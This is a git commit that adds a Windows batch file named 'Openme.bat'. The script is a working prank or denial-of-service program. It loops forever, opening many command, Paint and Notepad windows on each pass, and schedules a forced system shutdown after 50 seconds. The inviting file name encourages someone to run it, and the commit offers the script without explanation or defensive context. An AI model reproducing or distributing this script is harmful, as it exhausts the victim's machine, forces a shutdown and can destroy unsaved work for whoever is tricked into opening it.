3902ec79c5562d30f046163a7502d9f78fdbb86f
John Paul Batusan <johnpaul.batusa@gmail.com>
2020-07-13 12:04:07 +0800

    New bat

---
+++ Openme.bat
@@ -0,0 +1,26 @@
+@echo off
+
+:here
+start color 2
+start tree
+start
+start tree
+start
+start tree
+start
+start tree
+start
+start tree
+start
+start tree
+start 
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+shutdown.exe -s -t 50
+goto here
